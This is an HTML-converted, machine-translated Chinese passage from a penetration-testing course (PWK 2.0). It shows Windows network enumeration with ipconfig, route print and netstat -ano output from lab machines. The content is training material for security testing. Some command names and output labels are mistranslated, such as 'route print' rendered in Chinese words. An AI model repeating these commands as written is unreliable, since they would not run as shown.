<div style="position:absolute;top:91447;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IPv4 地址。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.111</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (首选)</font></font></nobr></div>
<div style="position:absolute;top:91465;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子网掩码 。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 255.255.255.0</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:91523;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">453 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/ipconfig</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:91651;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="78"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 78 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:91684;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:92761;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:92761;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:92761;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">519</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:91780;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认网关 。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 192.168.1.1</font></font></nobr></div>
<div style="position:absolute;top:91796;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DHCPv6 IAID。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 167775273</font></font></nobr></div>
<div style="position:absolute;top:91813;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DHCPv6 客户端 DUID。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 00-01-00-01-25-55-82-FF-00-0C-29-C1-ED-B0</font></font></nobr></div>
<div style="position:absolute;top:91830;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DNS 服务器。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: fec0:0:0:ffff::1%1</font></font></nobr></div>
<div style="position:absolute;top:91848;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">fec0:0:0:ffff::2%1</font></font></nobr></div>
<div style="position:absolute;top:91864;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">fec0:0:0:ffff::3%1</font></font></nobr></div>
<div style="position:absolute;top:91881;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于 Tcpip 的 NetBIOS。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 启用</font></font></nobr></div>
<div style="position:absolute;top:91917;left:211"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 524 - 列出 Windows 上所有可用适配器的完整 TCP/IP 配置</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:91947;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这台机器确实有多个网络接口。</font><font style="vertical-align: inherit;">接下来，让我们仔细看看它的路由</font></font></nobr></div>
<div style="position:absolute;top:91967;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表。</font></font></nobr></div>
<div style="position:absolute;top:91999;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要显示网络路由表，我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">route</font></font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 454</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令后跟</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印</font></font></font></b></nobr></div>
<div style="position:absolute;top:92019;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">争论。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:92053;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\student&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">路线打印</font></font></font></b></nobr></div>
<div style="position:absolute;top:92070;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">================================================== ==========================</font></font></nobr></div>
<div style="position:absolute;top:92087;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接口列表</font></font></nobr></div>
<div style="position:absolute;top:92105;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15...00 0c 29 c1 ed b0 ......Intel(R) 82574L 千兆网络连接</font></font></nobr></div>
<div style="position:absolute;top:92122;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4...00 0c 29 c1 ed ba ......Intel(R) 82574L 千兆网络连接 #2</font></font></nobr></div>
<div style="position:absolute;top:92138;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1................................软件环回接口 1</font></font></nobr></div>
<div style="position:absolute;top:92155;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">================================================== ==========================</font></font></nobr></div>
<div style="position:absolute;top:92189;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IPv4 路由表</font></font></nobr></div>
<div style="position:absolute;top:92206;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">================================================== ==========================</font></font></nobr></div>
<div style="position:absolute;top:92223;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">活动路线：</font></font></nobr></div>
<div style="position:absolute;top:92240;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络目的地    </font></font></nobr></div>
<div style="position:absolute;top:92240;left:328"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络掩码    </font></font></nobr></div>
<div style="position:absolute;top:92240;left:465"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网关接口指标</font></font></nobr></div>
<div style="position:absolute;top:92257;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0    </font></font></nobr></div>
<div style="position:absolute;top:92257;left:328"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0 192.168.1.1 192.168.1.111 281</font></font></nobr></div>
<div style="position:absolute;top:92274;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0    </font></font></nobr></div>
<div style="position:absolute;top:92274;left:328"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0    </font></font></nobr></div>
<div style="position:absolute;top:92274;left:449"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.2 10.11.0.22 281</font></font></nobr></div>
<div style="position:absolute;top:92291;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.0 255.255.255.0    </font></font></nobr></div>
<div style="position:absolute;top:92291;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在线链接    </font></font></nobr></div>
<div style="position:absolute;top:92291;left:579"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.22 281</font></font></nobr></div>
<div style="position:absolute;top:92308;left:166"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.22 255.255.255.255    </font></font></nobr></div>
<div style="position:absolute;top:92308;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在线链接    </font></font></nobr></div>
<div style="position:absolute;top:92308;left:579"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.22 281</font></font></nobr></div>
<div style="position:absolute;top:92325;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.255 255.255.255.255    </font></font></nobr></div>
<div style="position:absolute;top:92325;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在线链接    </font></font></nobr></div>
<div style="position:absolute;top:92325;left:579"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.22 281</font></font></nobr></div>
<div style="position:absolute;top:92342;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">127.0.0.0    </font></font></nobr></div>
<div style="position:absolute;top:92342;left:311"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">255.0.0.0    </font></font></nobr></div>
<div style="position:absolute;top:92342;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在线链接    </font></font></nobr></div>
<div style="position:absolute;top:92342;left:587"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">127.0.0.1 331</font></font></nobr></div>
<div style="position:absolute;top:92359;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">127.0.0.1 255.255.255.255    </font></font></nobr></div>
<div style="position:absolute;top:92359;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在线链接    </font></font></nobr></div>
<div style="position:absolute;top:92359;left:587"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">127.0.0.1 331</font></font></nobr></div>
<div style="position:absolute;top:92376;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">127.255.255.255 255.255.255.255    </font></font></nobr></div>
<div style="position:absolute;top:92376;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在线链接    </font></font></nobr></div>
<div style="position:absolute;top:92376;left:587"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">127.0.0.1 331</font></font></nobr></div>
<div style="position:absolute;top:92393;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.0 255.255.255.0    </font></font></nobr></div>
<div style="position:absolute;top:92393;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在线 192.168.1.111 281</font></font></nobr></div>
<div style="position:absolute;top:92410;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.111 255.255.255.255    </font></font></nobr></div>
<div style="position:absolute;top:92410;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在线 192.168.1.111 281</font></font></nobr></div>
<div style="position:absolute;top:92427;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.255 255.255.255.255    </font></font></nobr></div>
<div style="position:absolute;top:92427;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在线 192.168.1.111 281</font></font></nobr></div>
<div style="position:absolute;top:92444;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">224.0.0.0    </font></font></nobr></div>
<div style="position:absolute;top:92444;left:311"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">240.0.0.0    </font></font></nobr></div>
<div style="position:absolute;top:92444;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在线链接    </font></font></nobr></div>
<div style="position:absolute;top:92444;left:587"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">127.0.0.1 331</font></font></nobr></div>
<div style="position:absolute;top:92461;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">224.0.0.0    </font></font></nobr></div>
<div style="position:absolute;top:92461;left:311"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">240.0.0.0    </font></font></nobr></div>
<div style="position:absolute;top:92461;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在线 192.168.1.111 281</font></font></nobr></div>
<div style="position:absolute;top:92478;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">224.0.0.0    </font></font></nobr></div>
<div style="position:absolute;top:92478;left:311"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">240.0.0.0    </font></font></nobr></div>
<div style="position:absolute;top:92478;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在线链接    </font></font></nobr></div>
<div style="position:absolute;top:92478;left:579"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.22 281</font></font></nobr></div>
<div style="position:absolute;top:92495;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">255.255.255.255 255.255.255.255    </font></font></nobr></div>
<div style="position:absolute;top:92495;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在线链接    </font></font></nobr></div>
<div style="position:absolute;top:92495;left:587"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">127.0.0.1 331</font></font></nobr></div>
<div style="position:absolute;top:92512;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">255.255.255.255 255.255.255.255    </font></font></nobr></div>
<div style="position:absolute;top:92512;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在线 192.168.1.111 281</font></font></nobr></div>
<div style="position:absolute;top:92529;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">255.255.255.255 255.255.255.255    </font></font></nobr></div>
<div style="position:absolute;top:92529;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在线链接    </font></font></nobr></div>
<div style="position:absolute;top:92529;left:579"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.22 281</font></font></nobr></div>
<div style="position:absolute;top:92546;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">================================================== ==========================</font></font></nobr></div>
<div style="position:absolute;top:92563;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">持久路由：</font></font></nobr></div>
<div style="position:absolute;top:92579;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络地址    </font></font></nobr></div>
<div style="position:absolute;top:92579;left:328"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络掩码网关地址度量</font></font></nobr></div>
<div style="position:absolute;top:92597;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0    </font></font></nobr></div>
<div style="position:absolute;top:92597;left:328"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0 192.168.1.1 默认</font></font></nobr></div>
<div style="position:absolute;top:92614;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0    </font></font></nobr></div>
<div style="position:absolute;top:92614;left:328"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0    </font></font></nobr></div>
<div style="position:absolute;top:92614;left:449"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.2 默认</font></font></nobr></div>
<div style="position:absolute;top:92631;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">================================================== ==========================</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:92711;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">454 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2015 年），https:</font></font><font style="vertical-align: inherit;"> //docs.microsoft.com/en-us/previous-versions/windows/embedded/jj898618 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=winembedded.70)</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:92839;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="79"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 79 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:92872;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:93949;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:93949;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:93949;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">520</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:92968;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IPv6 路由表</font></font></nobr></div>
<div style="position:absolute;top:92984;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">================================================== ==========================</font></font></nobr></div>
<div style="position:absolute;top:93001;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">活动路线：</font></font></nobr></div>
<div style="position:absolute;top:93018;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果公制网络目标网关</font></font></nobr></div>
<div style="position:absolute;top:93036;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1 331 ::1/128    </font></font></nobr></div>
<div style="position:absolute;top:93036;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在线链接</font></font></nobr></div>
<div style="position:absolute;top:93052;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4 281 fe80::/64    </font></font></nobr></div>
<div style="position:absolute;top:93052;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在线链接</font></font></nobr></div>
<div style="position:absolute;top:93069;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15 281 fe80::/64    </font></font></nobr></div>
<div style="position:absolute;top:93069;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在线链接</font></font></nobr></div>
<div style="position:absolute;top:93086;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4 281 fe80::9d3e:158a:241b:beb7/128</font></font></nobr></div>
<div style="position:absolute;top:93103;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在线链接</font></font></nobr></div>
<div style="position:absolute;top:93120;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15 281 fe80::bc64:ab2f:a10f:edc9/128</font></font></nobr></div>
<div style="position:absolute;top:93137;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在线链接</font></font></nobr></div>
<div style="position:absolute;top:93154;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1 331 ff00::/8    </font></font></nobr></div>
<div style="position:absolute;top:93154;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在线链接</font></font></nobr></div>
<div style="position:absolute;top:93171;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4 281 ff00::/8    </font></font></nobr></div>
<div style="position:absolute;top:93171;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在线链接</font></font></nobr></div>
<div style="position:absolute;top:93188;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15 281 ff00::/8    </font></font></nobr></div>
<div style="position:absolute;top:93188;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在线链接</font></font></nobr></div>
<div style="position:absolute;top:93205;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">================================================== ==========================</font></font></nobr></div>
<div style="position:absolute;top:93222;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">持久路由：</font></font></nobr></div>
<div style="position:absolute;top:93239;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">没有任何</font></font></nobr></div>
<div style="position:absolute;top:93258;left:332"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 525 - 在 Windows 上打印路由</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:93288;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">netstat</font></font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 455</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查看活动的网络连接。</font><font style="vertical-align: inherit;">指定</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">a</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志将</font></font></nobr></div>
<div style="position:absolute;top:93307;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示所有活动的 TCP 连接，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">n</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志允许我们显示地址和端口号</font></font></nobr></div>
<div style="position:absolute;top:93327;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个数字形式，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">o</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志将显示每个连接的所有者 PID。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:93361;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\用户\学生&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">netstat -ano</font></font></font></b></nobr></div>
<div style="position:absolute;top:93396;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">活动连接</font></font></nobr></div>
<div style="position:absolute;top:93429;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">原始本地地址    </font></font></nobr></div>
<div style="position:absolute;top:93429;left:368"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">国外地址    </font></font></nobr></div>
<div style="position:absolute;top:93429;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">状态    </font></font></nobr></div>
<div style="position:absolute;top:93429;left:684"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PID</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:93446;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP 0.0.0.0:80    </font></font></b></nobr></div>
<div style="position:absolute;top:93446;left:368"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0:0    </font></font></b></nobr></div>
<div style="position:absolute;top:93446;left:554"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">聆听 7432</font></font></b></nobr></div>
<div style="position:absolute;top:93463;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP 0.0.0.0:135    </font></font></b></nobr></div>
<div style="position:absolute;top:93463;left:368"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0:0    </font></font></b></nobr></div>
<div style="position:absolute;top:93463;left:554"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听力 776</font></font></b></nobr></div>
<div style="position:absolute;top:93480;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP 0.0.0.0:445    </font></font></b></nobr></div>
<div style="position:absolute;top:93480;left:368"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0:0    </font></font></b></nobr></div>
<div style="position:absolute;top:93480;left:554"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听力4</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:93497;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP 0.0.0.0:3306    </font></font></nobr></div>
<div style="position:absolute;top:93497;left:368"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0:0    </font></font></nobr></div>
<div style="position:absolute;top:93497;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听力 1472</font></font></nobr></div>
<div style="position:absolute;top:93514;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP 0.0.0.0:3389    </font></font></nobr></div>
<div style="position:absolute;top:93514;left:368"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0:0    </font></font></nobr></div>
<div style="position:absolute;top:93514;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听力 952</font></font></nobr></div>
<div style="position:absolute;top:93531;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP 0.0.0.0:8895    </font></font></nobr></div>
<div style="position:absolute;top:93531;left:368"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0:0    </font></font></nobr></div>
<div style="position:absolute;top:93531;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听力 2284</font></font></nobr></div>
<div style="position:absolute;top:93548;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP 0.0.0.0:9121    </font></font></nobr></div>
<div style="position:absolute;top:93548;left:368"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0:0    </font></font></nobr></div>
<div style="position:absolute;top:93548;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">聆听 7432</font></font></nobr></div>
<div style="position:absolute;top:93565;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:93582;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP 127.0.0.1:49689    </font></font></b></nobr></div>
<div style="position:absolute;top:93582;left:368"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">127.0.0.1:49690    </font></font></b></nobr></div>
<div style="position:absolute;top:93582;left:554"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成立 2284</font></font></b></nobr></div>
<div style="position:absolute;top:93599;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP 127.0.0.1:49690    </font></font></b></nobr></div>
<div style="position:absolute;top:93599;left:368"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">127.0.0.1:49689    </font></font></b></nobr></div>
